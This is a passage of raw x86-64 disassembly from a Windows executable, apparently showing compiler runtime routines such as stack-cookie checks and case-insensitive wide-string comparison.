   140003bb8:	48 8d 3d 45 79 03 00 	lea    0x37945(%rip),%rdi        # 0x14003b504
   140003bbf:	48 8b 85 d8 00 00 00 	mov    0xd8(%rbp),%rax
   140003bc6:	48 89 7d a0          	mov    %rdi,-0x60(%rbp)
   140003bca:	49 8b 7d 00          	mov    0x0(%r13),%rdi
   140003bce:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   140003bd2:	48 8b 85 d0 00 00 00 	mov    0xd0(%rbp),%rax
   140003bd9:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140003bdd:	89 75 a8             	mov    %esi,-0x58(%rbp)
   140003be0:	89 55 ac             	mov    %edx,-0x54(%rbp)
   140003be3:	48 c7 45 98 04 00 00 	movq   $0x4,-0x68(%rbp)
   140003bea:	00 
   140003beb:	48 c7 45 88 01 00 00 	movq   $0x1,-0x78(%rbp)
   140003bf2:	00 
   140003bf3:	48 85 ff             	test   %rdi,%rdi
   140003bf6:	74 0e                	je     0x140003c06
   140003bf8:	48 8b cf             	mov    %rdi,%rcx
   140003bfb:	e8 70 d8 02 00       	call   0x140031470
   140003c00:	03 c3                	add    %ebx,%eax
   140003c02:	33 d2                	xor    %edx,%edx
   140003c04:	eb 09                	jmp    0x140003c0f
   140003c06:	48 8d 3d f3 78 03 00 	lea    0x378f3(%rip),%rdi        # 0x14003b500
   140003c0d:	8b c3                	mov    %ebx,%eax
   140003c0f:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140003c13:	48 8d 0d 96 f6 03 00 	lea    0x3f696(%rip),%rcx        # 0x1400432b0
   140003c1a:	48 8b 85 c0 00 00 00 	mov    0xc0(%rbp),%rax
   140003c21:	45 33 c9             	xor    %r9d,%r9d
   140003c24:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003c29:	45 33 c0             	xor    %r8d,%r8d
   140003c2c:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140003c31:	89 54 24 7c          	mov    %edx,0x7c(%rsp)
   140003c35:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   140003c3a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003c3f:	c7 44 24 20 12 00 00 	movl   $0x12,0x20(%rsp)
   140003c46:	00 
   140003c47:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   140003c4c:	48 c7 44 24 68 08 00 	movq   $0x8,0x68(%rsp)
   140003c53:	00 00 
   140003c55:	e8 82 f7 ff ff       	call   0x1400033dc
   140003c5a:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140003c5e:	48 33 cc             	xor    %rsp,%rcx
   140003c61:	e8 ea 56 00 00       	call   0x140009350
   140003c66:	4c 8d 9c 24 70 01 00 	lea    0x170(%rsp),%r11
   140003c6d:	00 
   140003c6e:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140003c72:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140003c76:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   140003c7a:	49 8b e3             	mov    %r11,%rsp
   140003c7d:	41 5f                	pop    %r15
   140003c7f:	41 5e                	pop    %r14
   140003c81:	41 5d                	pop    %r13
   140003c83:	41 5c                	pop    %r12
   140003c85:	5d                   	pop    %rbp
   140003c86:	c3                   	ret
   140003c87:	cc                   	int3
   140003c88:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003c8d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003c92:	55                   	push   %rbp
   140003c93:	57                   	push   %rdi
   140003c94:	41 54                	push   %r12
   140003c96:	41 56                	push   %r14
   140003c98:	41 57                	push   %r15
   140003c9a:	48 8d 6c 24 f9       	lea    -0x7(%rsp),%rbp
   140003c9f:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   140003ca6:	48 8b 05 03 03 04 00 	mov    0x40303(%rip),%rax        # 0x140043fb0
   140003cad:	48 33 c4             	xor    %rsp,%rax
   140003cb0:	48 89 45 f7          	mov    %rax,-0x9(%rbp)
   140003cb4:	48 8b 85 8f 00 00 00 	mov    0x8f(%rbp),%rax
   140003cbb:	4c 8b e2             	mov    %rdx,%r12
   140003cbe:	4c 8b 7d 67          	mov    0x67(%rbp),%r15
   140003cc2:	4c 8b 75 6f          	mov    0x6f(%rbp),%r14
   140003cc6:	48 8b 75 77          	mov    0x77(%rbp),%rsi
   140003cca:	48 8b 38             	mov    (%rax),%rdi
   140003ccd:	48 85 ff             	test   %rdi,%rdi
   140003cd0:	74 11                	je     0x140003ce3
   140003cd2:	48 8b cf             	mov    %rdi,%rcx
   140003cd5:	e8 96 d7 02 00       	call   0x140031470
   140003cda:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003cdf:	03 c3                	add    %ebx,%eax
   140003ce1:	eb 0e                	jmp    0x140003cf1
   140003ce3:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003ce8:	48 8d 3d 11 78 03 00 	lea    0x37811(%rip),%rdi        # 0x14003b500
   140003cef:	8b c3                	mov    %ebx,%eax
   140003cf1:	83 65 f3 00          	andl   $0x0,-0xd(%rbp)
   140003cf5:	83 65 e3 00          	andl   $0x0,-0x1d(%rbp)
   140003cf9:	83 65 d3 00          	andl   $0x0,-0x2d(%rbp)
   140003cfd:	89 45 ef             	mov    %eax,-0x11(%rbp)
   140003d00:	48 8b 85 87 00 00 00 	mov    0x87(%rbp),%rax
   140003d07:	48 89 7d e7          	mov    %rdi,-0x19(%rbp)
   140003d0b:	48 8b 3e             	mov    (%rsi),%rdi
   140003d0e:	48 89 45 d7          	mov    %rax,-0x29(%rbp)
   140003d12:	48 8b 45 7f          	mov    0x7f(%rbp),%rax
   140003d16:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   140003d1a:	89 5d df             	mov    %ebx,-0x21(%rbp)
   140003d1d:	c7 45 cf 04 00 00 00 	movl   $0x4,-0x31(%rbp)
   140003d24:	48 85 ff             	test   %rdi,%rdi
   140003d27:	74 0c                	je     0x140003d35
   140003d29:	48 8b cf             	mov    %rdi,%rcx
   140003d2c:	e8 3f d7 02 00       	call   0x140031470
   140003d31:	03 c3                	add    %ebx,%eax
   140003d33:	eb 09                	jmp    0x140003d3e
   140003d35:	48 8d 3d c4 77 03 00 	lea    0x377c4(%rip),%rdi        # 0x14003b500
   140003d3c:	8b c3                	mov    %ebx,%eax
   140003d3e:	83 65 c3 00          	andl   $0x0,-0x3d(%rbp)
   140003d42:	48 89 7d b7          	mov    %rdi,-0x49(%rbp)
   140003d46:	49 8b 3e             	mov    (%r14),%rdi
   140003d49:	89 45 bf             	mov    %eax,-0x41(%rbp)
   140003d4c:	48 85 ff             	test   %rdi,%rdi
   140003d4f:	74 0c                	je     0x140003d5d
   140003d51:	48 8b cf             	mov    %rdi,%rcx
   140003d54:	e8 17 d7 02 00       	call   0x140031470
   140003d59:	03 c3                	add    %ebx,%eax
   140003d5b:	eb 09                	jmp    0x140003d66
   140003d5d:	48 8d 3d 9c 77 03 00 	lea    0x3779c(%rip),%rdi        # 0x14003b500
   140003d64:	8b c3                	mov    %ebx,%eax
   140003d66:	83 65 b3 00          	andl   $0x0,-0x4d(%rbp)
   140003d6a:	48 89 7d a7          	mov    %rdi,-0x59(%rbp)
   140003d6e:	49 8b 3f             	mov    (%r15),%rdi
   140003d71:	89 45 af             	mov    %eax,-0x51(%rbp)
   140003d74:	48 85 ff             	test   %rdi,%rdi
   140003d77:	74 0c                	je     0x140003d85
   140003d79:	48 8b cf             	mov    %rdi,%rcx
   140003d7c:	e8 ef d6 02 00       	call   0x140031470
   140003d81:	03 c3                	add    %ebx,%eax
   140003d83:	eb 09                	jmp    0x140003d8e
   140003d85:	48 8d 3d 74 77 03 00 	lea    0x37774(%rip),%rdi        # 0x14003b500
   140003d8c:	8b c3                	mov    %ebx,%eax
   140003d8e:	83 65 a3 00          	andl   $0x0,-0x5d(%rbp)
   140003d92:	48 8d 0d 17 f5 03 00 	lea    0x3f517(%rip),%rcx        # 0x1400432b0
   140003d99:	83 65 93 00          	andl   $0x0,-0x6d(%rbp)
   140003d9d:	45 33 c9             	xor    %r9d,%r9d
   140003da0:	83 65 83 00          	andl   $0x0,-0x7d(%rbp)
   140003da4:	45 33 c0             	xor    %r8d,%r8d
   140003da7:	89 45 9f             	mov    %eax,-0x61(%rbp)
   140003daa:	49 8b d4             	mov    %r12,%rdx
   140003dad:	48 8b 45 5f          	mov    0x5f(%rbp),%rax
   140003db1:	48 89 45 87          	mov    %rax,-0x79(%rbp)
   140003db5:	48 8b 45 57          	mov    0x57(%rbp),%rax
   140003db9:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140003dbe:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140003dc3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003dc8:	c7 44 24 20 0a 00 00 	movl   $0xa,0x20(%rsp)
   140003dcf:	00 
   140003dd0:	48 89 7d 97          	mov    %rdi,-0x69(%rbp)
   140003dd4:	89 5d 8f             	mov    %ebx,-0x71(%rbp)
   140003dd7:	c7 44 24 58 08 00 00 	movl   $0x8,0x58(%rsp)
   140003dde:	00 
   140003ddf:	e8 f8 f5 ff ff       	call   0x1400033dc
   140003de4:	48 8b 4d f7          	mov    -0x9(%rbp),%rcx
   140003de8:	48 33 cc             	xor    %rsp,%rcx
   140003deb:	e8 60 55 00 00       	call   0x140009350
   140003df0:	4c 8d 9c 24 e0 00 00 	lea    0xe0(%rsp),%r11
   140003df7:	00 
   140003df8:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140003dfc:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140003e00:	49 8b e3             	mov    %r11,%rsp
   140003e03:	41 5f                	pop    %r15
   140003e05:	41 5e                	pop    %r14
   140003e07:	41 5c                	pop    %r12
   140003e09:	5f                   	pop    %rdi
   140003e0a:	5d                   	pop    %rbp
   140003e0b:	c3                   	ret
   140003e0c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003e11:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003e16:	57                   	push   %rdi
   140003e17:	48 83 ec 50          	sub    $0x50,%rsp
   140003e1b:	48 8b 05 8e 01 04 00 	mov    0x4018e(%rip),%rax        # 0x140043fb0
   140003e22:	48 33 c4             	xor    %rsp,%rax
   140003e25:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140003e2a:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140003e2e:	48 8d 71 20          	lea    0x20(%rcx),%rsi
   140003e32:	48 83 3e 00          	cmpq   $0x0,(%rsi)
   140003e36:	48 8b f9             	mov    %rcx,%rdi
   140003e39:	0f 10 40 f0          	movups -0x10(%rax),%xmm0
   140003e3d:	f3 0f 7f 44 24 30    	movdqu %xmm0,0x30(%rsp)
   140003e43:	74 07                	je     0x140003e4c
   140003e45:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003e4a:	cd 29                	int    $0x29
   140003e4c:	48 83 67 28 00       	andq   $0x0,0x28(%rdi)
   140003e51:	48 8d 15 78 00 00 00 	lea    0x78(%rip),%rdx        # 0x140003ed0
   140003e58:	48 83 67 30 00       	andq   $0x0,0x30(%rdi)
   140003e5d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003e62:	4c 8b ce             	mov    %rsi,%r9
   140003e65:	4c 8b c7             	mov    %rdi,%r8
   140003e68:	ff 15 aa 17 03 00    	call   *0x317aa(%rip)        # 0x140035618
   140003e6e:	8b d8                	mov    %eax,%ebx
   140003e70:	85 c0                	test   %eax,%eax
   140003e72:	74 0d                	je     0x140003e81
   140003e74:	7e 2c                	jle    0x140003ea2
   140003e76:	0f b7 d8             	movzwl %ax,%ebx
   140003e79:	81 cb 00 00 07 80    	or     $0x80070000,%ebx
   140003e7f:	eb 21                	jmp    0x140003ea2
   140003e81:	48 8b 05 30 19 04 00 	mov    0x41930(%rip),%rax        # 0x1400457b8
   140003e88:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   140003e8c:	48 85 c0             	test   %rax,%rax
   140003e8f:	74 11                	je     0x140003ea2
   140003e91:	45 0f b7 08          	movzwl (%r8),%r9d
   140003e95:	ba 02 00 00 00       	mov    $0x2,%edx
   140003e9a:	48 8b 0e             	mov    (%rsi),%rcx
   140003e9d:	e8 ae d5 02 00       	call   0x140031450
   140003ea2:	8b c3                	mov    %ebx,%eax
   140003ea4:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003ea9:	48 33 cc             	xor    %rsp,%rcx
   140003eac:	e8 9f 54 00 00       	call   0x140009350
   140003eb1:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140003eb6:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140003ebb:	48 83 c4 50          	add    $0x50,%rsp
   140003ebf:	5f                   	pop    %rdi
   140003ec0:	c3                   	ret
   140003ec1:	cc                   	int3
   140003ec2:	cc                   	int3
   140003ec3:	cc                   	int3
   140003ec4:	cc                   	int3
   140003ec5:	cc                   	int3
   140003ec6:	cc                   	int3
   140003ec7:	cc                   	int3
   140003ec8:	cc                   	int3
   140003ec9:	cc                   	int3
   140003eca:	cc                   	int3
   140003ecb:	cc                   	int3
   140003ecc:	cc                   	int3
   140003ecd:	cc                   	int3
   140003ece:	cc                   	int3
   140003ecf:	cc                   	int3
   140003ed0:	48 83 ec 48          	sub    $0x48,%rsp
   140003ed4:	4c 8b d9             	mov    %rcx,%r11
   140003ed7:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140003ede:	00 
   140003edf:	48 85 c9             	test   %rcx,%rcx
   140003ee2:	74 5a                	je     0x140003f3e
   140003ee4:	4c 8b 54 24 70       	mov    0x70(%rsp),%r10
   140003ee9:	8b c2                	mov    %edx,%eax
   140003eeb:	85 d2                	test   %edx,%edx
   140003eed:	74 23                	je     0x140003f12
   140003eef:	83 f8 01             	cmp    $0x1,%eax
   140003ef2:	75 21                	jne    0x140003f15
   140003ef4:	45 84 c0             	test   %r8b,%r8b
   140003ef7:	74 08                	je     0x140003f01
   140003ef9:	41 0f b6 c0          	movzbl %r8b,%eax
   140003efd:	ff c0                	inc    %eax
   140003eff:	eb 05                	jmp    0x140003f06
   140003f01:	b8 00 01 00 00       	mov    $0x100,%eax
   140003f06:	89 01                	mov    %eax,(%rcx)
   140003f08:	4c 89 49 10          	mov    %r9,0x10(%rcx)
   140003f0c:	4c 89 51 18          	mov    %r10,0x18(%rcx)
   140003f10:	eb 03                	jmp    0x140003f15
   140003f12:	83 21 00             	andl   $0x0,(%rcx)
   140003f15:	48 8b 41 28          	mov    0x28(%rcx),%rax
   140003f19:	48 85 c0             	test   %rax,%rax
   140003f1c:	74 20                	je     0x140003f3e
   140003f1e:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   140003f22:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003f27:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140003f2c:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003f31:	49 8b cb             	mov    %r11,%rcx
   140003f34:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140003f39:	e8 12 d5 02 00       	call   0x140031450
   140003f3e:	48 83 c4 48          	add    $0x48,%rsp
   140003f42:	c3                   	ret
   140003f43:	cc                   	int3
   140003f44:	cc                   	int3
   140003f45:	cc                   	int3
   140003f46:	cc                   	int3
   140003f47:	cc                   	int3
   140003f48:	cc                   	int3
   140003f49:	cc                   	int3
   140003f4a:	cc                   	int3
   140003f4b:	cc                   	int3
   140003f4c:	cc                   	int3
   140003f4d:	cc                   	int3
   140003f4e:	cc                   	int3
   140003f4f:	cc                   	int3
   140003f50:	48 8d 0d b9 e5 02 00 	lea    0x2e5b9(%rip),%rcx        # 0x140032510
   140003f57:	e9 c0 56 00 00       	jmp    0x14000961c
   140003f5c:	cc                   	int3
   140003f5d:	cc                   	int3
   140003f5e:	cc                   	int3
   140003f5f:	cc                   	int3
   140003f60:	48 8d 0d d9 e5 02 00 	lea    0x2e5d9(%rip),%rcx        # 0x140032540
   140003f67:	e9 b0 56 00 00       	jmp    0x14000961c
   140003f6c:	cc                   	int3
   140003f6d:	cc                   	int3
   140003f6e:	cc                   	int3
   140003f6f:	cc                   	int3
   140003f70:	4c 8d 05 39 a0 02 00 	lea    0x2a039(%rip),%r8        # 0x14002dfb0
   140003f77:	48 8d 15 b2 a0 02 00 	lea    0x2a0b2(%rip),%rdx        # 0x14002e030
   140003f7e:	48 8d 0d 1b 16 04 00 	lea    0x4161b(%rip),%rcx        # 0x1400455a0
   140003f85:	e9 ea a3 02 00       	jmp    0x14002e374
   140003f8a:	cc                   	int3
   140003f8b:	cc                   	int3
   140003f8c:	cc                   	int3
   140003f8d:	cc                   	int3
   140003f8e:	cc                   	int3
   140003f8f:	cc                   	int3
   140003f90:	48 83 ec 28          	sub    $0x28,%rsp
   140003f94:	4c 8d 05 85 b0 02 00 	lea    0x2b085(%rip),%r8        # 0x14002f020
   140003f9b:	48 8d 15 be b0 02 00 	lea    0x2b0be(%rip),%rdx        # 0x14002f060
   140003fa2:	48 8d 0d 4f 16 04 00 	lea    0x4164f(%rip),%rcx        # 0x1400455f8
   140003fa9:	e8 c6 a3 02 00       	call   0x14002e374
   140003fae:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003fb1:	66 0f 7f 05 67 16 04 	movdqa %xmm0,0x41667(%rip)        # 0x140045620
   140003fb8:	00 
   140003fb9:	48 83 c4 28          	add    $0x28,%rsp
   140003fbd:	c3                   	ret
   140003fbe:	cc                   	int3
   140003fbf:	cc                   	int3
   140003fc0:	48 8d 0d a9 e5 02 00 	lea    0x2e5a9(%rip),%rcx        # 0x140032570
   140003fc7:	e9 50 56 00 00       	jmp    0x14000961c
   140003fcc:	cc                   	int3
   140003fcd:	cc                   	int3
   140003fce:	cc                   	int3
   140003fcf:	cc                   	int3
   140003fd0:	48 83 ec 28          	sub    $0x28,%rsp
   140003fd4:	e8 db d9 01 00       	call   0x1400219b4
   140003fd9:	48 83 08 04          	orq    $0x4,(%rax)
   140003fdd:	e8 ba 79 02 00       	call   0x14002b99c
   140003fe2:	48 83 08 02          	orq    $0x2,(%rax)
   140003fe6:	33 c0                	xor    %eax,%eax
   140003fe8:	48 83 c4 28          	add    $0x28,%rsp
   140003fec:	c3                   	ret
   140003fed:	cc                   	int3
   140003fee:	cc                   	int3
   140003fef:	cc                   	int3
   140003ff0:	48 83 ec 28          	sub    $0x28,%rsp
   140003ff4:	e8 bb d9 01 00       	call   0x1400219b4
   140003ff9:	48 83 08 18          	orq    $0x18,(%rax)
   140003ffd:	e8 9a 79 02 00       	call   0x14002b99c
   140004002:	48 83 08 04          	orq    $0x4,(%rax)
   140004006:	33 c0                	xor    %eax,%eax
   140004008:	48 83 c4 28          	add    $0x28,%rsp
   14000400c:	c3                   	ret
   14000400d:	cc                   	int3
   14000400e:	cc                   	int3
   14000400f:	cc                   	int3
   140004010:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004015:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000401a:	57                   	push   %rdi
   14000401b:	48 83 ec 20          	sub    $0x20,%rsp
   14000401f:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   140004023:	48 8b f9             	mov    %rcx,%rdi
   140004026:	48 8d 71 08          	lea    0x8(%rcx),%rsi
   14000402a:	48 85 d2             	test   %rdx,%rdx
   14000402d:	74 05                	je     0x140004034
   14000402f:	0f 10 02             	movups (%rdx),%xmm0
   140004032:	eb 10                	jmp    0x140004044
   140004034:	83 3d 4d 02 04 00 00 	cmpl   $0x0,0x4024d(%rip)        # 0x140044288
   14000403b:	75 0d                	jne    0x14000404a
   14000403d:	0f 10 05 14 f1 03 00 	movups 0x3f114(%rip),%xmm0        # 0x140043158
   140004044:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   140004048:	eb 4e                	jmp    0x140004098
   14000404a:	e8 a1 12 00 00       	call   0x1400052f0
   14000404f:	48 89 07             	mov    %rax,(%rdi)
   140004052:	48 8b d6             	mov    %rsi,%rdx
   140004055:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   14000405c:	48 89 0e             	mov    %rcx,(%rsi)
   14000405f:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140004066:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   14000406a:	48 8b c8             	mov    %rax,%rcx
   14000406d:	e8 e2 15 00 00       	call   0x140005654
   140004072:	48 8b 0f             	mov    (%rdi),%rcx
   140004075:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140004079:	e8 42 16 00 00       	call   0x1400056c0
   14000407e:	48 8b 0f             	mov    (%rdi),%rcx
   140004081:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140004087:	a8 02                	test   $0x2,%al
   140004089:	75 0d                	jne    0x140004098
   14000408b:	83 c8 02             	or     $0x2,%eax
   14000408e:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   140004094:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   140004098:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000409d:	48 8b c7             	mov    %rdi,%rax
   1400040a0:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400040a5:	48 83 c4 20          	add    $0x20,%rsp
   1400040a9:	5f                   	pop    %rdi
   1400040aa:	c3                   	ret
   1400040ab:	cc                   	int3
   1400040ac:	4c 8b da             	mov    %rdx,%r11
   1400040af:	4c 8b d1             	mov    %rcx,%r10
   1400040b2:	45 0f b7 02          	movzwl (%r10),%r8d
   1400040b6:	4d 8d 52 02          	lea    0x2(%r10),%r10
   1400040ba:	41 0f b7 13          	movzwl (%r11),%edx
   1400040be:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   1400040c2:	41 8d 40 bf          	lea    -0x41(%r8),%eax
   1400040c6:	83 f8 19             	cmp    $0x19,%eax
   1400040c9:	45 8d 48 20          	lea    0x20(%r8),%r9d
   1400040cd:	8d 42 bf             	lea    -0x41(%rdx),%eax
   1400040d0:	45 0f 47 c8          	cmova  %r8d,%r9d
   1400040d4:	8d 4a 20             	lea    0x20(%rdx),%ecx
   1400040d7:	83 f8 19             	cmp    $0x19,%eax
   1400040da:	41 8b c1             	mov    %r9d,%eax
   1400040dd:	0f 47 ca             	cmova  %edx,%ecx
   1400040e0:	2b c1                	sub    %ecx,%eax
   1400040e2:	75 05                	jne    0x1400040e9
   1400040e4:	45 85 c9             	test   %r9d,%r9d
   1400040e7:	75 c9                	jne    0x1400040b2
   1400040e9:	c3                   	ret
   1400040ea:	cc                   	int3
   1400040eb:	cc                   	int3
   1400040ec:	48 83 ec 28          	sub    $0x28,%rsp
   1400040f0:	83 3d 91 01 04 00 00 	cmpl   $0x0,0x40191(%rip)        # 0x140044288
   1400040f7:	75 2d                	jne    0x140004126
   1400040f9:	48 85 c9             	test   %rcx,%rcx
   1400040fc:	75 1a                	jne    0x140004118
   1400040fe:	e8 21 0e 00 00       	call   0x140004f24
   140004103:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140004109:	e8 c2 0b 00 00       	call   0x140004cd0
   14000410e:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   140004113:	48 83 c4 28          	add    $0x28,%rsp
   140004117:	c3                   	ret
   140004118:	48 85 d2             	test   %rdx,%rdx
   14000411b:	74 e1                	je     0x1400040fe
   14000411d:	48 83 c4 28          	add    $0x28,%rsp
   140004121:	e9 86 ff ff ff       	jmp    0x1400040ac
   140004126:	45 33 c0             	xor    %r8d,%r8d
   140004129:	48 83 c4 28          	add    $0x28,%rsp
   14000412d:	e9 02 00 00 00       	jmp    0x140004134
   140004132:	cc                   	int3
   140004133:	cc                   	int3
   140004134:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004139:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000413e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004143:	57                   	push   %rdi
   140004144:	41 56                	push   %r14
   140004146:	41 57                	push   %r15
   140004148:	48 83 ec 40          	sub    $0x40,%rsp
   14000414c:	48 8b fa             	mov    %rdx,%rdi
   14000414f:	48 8b d9             	mov    %rcx,%rbx
   140004152:	48 85 c9             	test   %rcx,%rcx
   140004155:	75 1a                	jne    0x140004171
   140004157:	e8 c8 0d 00 00       	call   0x140004f24
   14000415c:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140004162:	e8 69 0b 00 00       	call   0x140004cd0
   140004167:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000416c:	e9 db 00 00 00       	jmp    0x14000424c
   140004171:	48 85 ff             	test   %rdi,%rdi
   140004174:	74 e1                	je     0x140004157
   140004176:	49 8b d0             	mov    %r8,%rdx
   140004179:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000417e:	e8 8d fe ff ff       	call   0x140004010
   140004183:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140004188:	48 83 b9 38 01 00 00 	cmpq   $0x0,0x138(%rcx)
   14000418f:	00 
   140004190:	75 12                	jne    0x1400041a4
   140004192:	48 8b d7             	mov    %rdi,%rdx
   140004195:	48 8b cb             	mov    %rbx,%rcx
   140004198:	e8 0f ff ff ff       	call   0x1400040ac
   14000419d:	8b f0                	mov    %eax,%esi
   14000419f:	e9 93 00 00 00       	jmp    0x140004237
   1400041a4:	41 be 00 01 00 00    	mov    $0x100,%r14d
   1400041aa:	4c 8d 3d 7f 29 03 00 	lea    0x3297f(%rip),%r15        # 0x140036b30
   1400041b1:	0f b7 03             	movzwl (%rbx),%eax
   1400041b4:	48 8d 5b 02          	lea    0x2(%rbx),%rbx
   1400041b8:	66 41 3b c6          	cmp    %r14w,%ax
   1400041bc:	73 1a                	jae    0x1400041d8
   1400041be:	0f b6 d0             	movzbl %al,%edx
   1400041c1:	41 f6 44 57 02 01    	testb  $0x1,0x2(%r15,%rdx,2)
   1400041c7:	74 0a                	je     0x1400041d3
   1400041c9:	48 8b 81 10 01 00 00 	mov    0x110(%rcx),%rax
   1400041d0:	8a 14 02             	mov    (%rdx,%rax,1),%dl
   1400041d3:	0f b6 c2             	movzbl %dl,%eax
   1400041d6:	eb 12                	jmp    0x1400041ea
   1400041d8:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   1400041dd:	0f b7 c8             	movzwl %ax,%ecx
   1400041e0:	e8 83 0b 00 00       	call   0x140004d68
   1400041e5:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400041ea:	0f b7 e8             	movzwl %ax,%ebp
   1400041ed:	0f b7 07             	movzwl (%rdi),%eax
   1400041f0:	8b f5                	mov    %ebp,%esi
   1400041f2:	48 83 c7 02          	add    $0x2,%rdi
   1400041f6:	66 41 3b c6          	cmp    %r14w,%ax
   1400041fa:	73 1a                	jae    0x140004216
   1400041fc:	0f b6 d0             	movzbl %al,%edx
   1400041ff:	41 f6 44 57 02 01    	testb  $0x1,0x2(%r15,%rdx,2)
   140004205:	74 0a                	je     0x140004211
   140004207:	48 8b 81 10 01 00 00 	mov    0x110(%rcx),%rax
   14000420e:	8a 14 02             	mov    (%rdx,%rax,1),%dl
   140004211:	0f b6 c2             	movzbl %dl,%eax
   140004214:	eb 12                	jmp    0x140004228
   140004216:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   14000421b:	0f b7 c8             	movzwl %ax,%ecx
   14000421e:	e8 45 0b 00 00       	call   0x140004d68
   140004223:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140004228:	0f b7 c0             	movzwl %ax,%eax
   14000422b:	2b f0                	sub    %eax,%esi
   14000422d:	75 08                	jne    0x140004237
   14000422f:	85 ed                	test   %ebp,%ebp
   140004231:	0f 85 7a ff ff ff    	jne    0x1400041b1
   140004237:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000423c:	74 0c                	je     0x14000424a
   14000423e:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140004243:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000424a:	8b c6                	mov    %esi,%eax
   14000424c:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004251:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140004256:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000425b:	48 83 c4 40          	add    $0x40,%rsp
   14000425f:	41 5f                	pop    %r15
   140004261:	41 5e                	pop    %r14
   140004263:	5f                   	pop    %rdi
   140004264:	c3                   	ret
   140004265:	cc                   	int3
   140004266:	cc                   	int3
   140004267:	cc                   	int3
   140004268:	cc                   	int3
   140004269:	cc                   	int3
   14000426a:	cc                   	int3
   14000426b:	cc                   	int3
   14000426c:	cc                   	int3
   14000426d:	cc                   	int3
   14000426e:	cc                   	int3
   14000426f:	cc                   	int3
   140004270:	8b 05 1a fd 03 00    	mov    0x3fd1a(%rip),%eax        # 0x140043f90
   140004276:	4c 8b d2             	mov    %rdx,%r10
   140004279:	4c 8b c9             	mov    %rcx,%r9
   14000427c:	83 f8 05             	cmp    $0x5,%eax
   14000427f:	0f 8c 9d 00 00 00    	jl     0x140004322
   140004285:	4c 8b c1             	mov    %rcx,%r8
   140004288:	b8 20 00 00 00       	mov    $0x20,%eax
   14000428d:	41 83 e0 1f          	and    $0x1f,%r8d
   140004291:	49 2b c0             	sub    %r8,%rax
   140004294:	49 f7 d8             	neg    %r8
   140004297:	4c 8b c1             	mov    %rcx,%r8
   14000429a:	4d 1b db             	sbb    %r11,%r11
   14000429d:	4c 23 d8             	and    %rax,%r11
   1400042a0:	49 3b d3             	cmp    %r11,%rdx
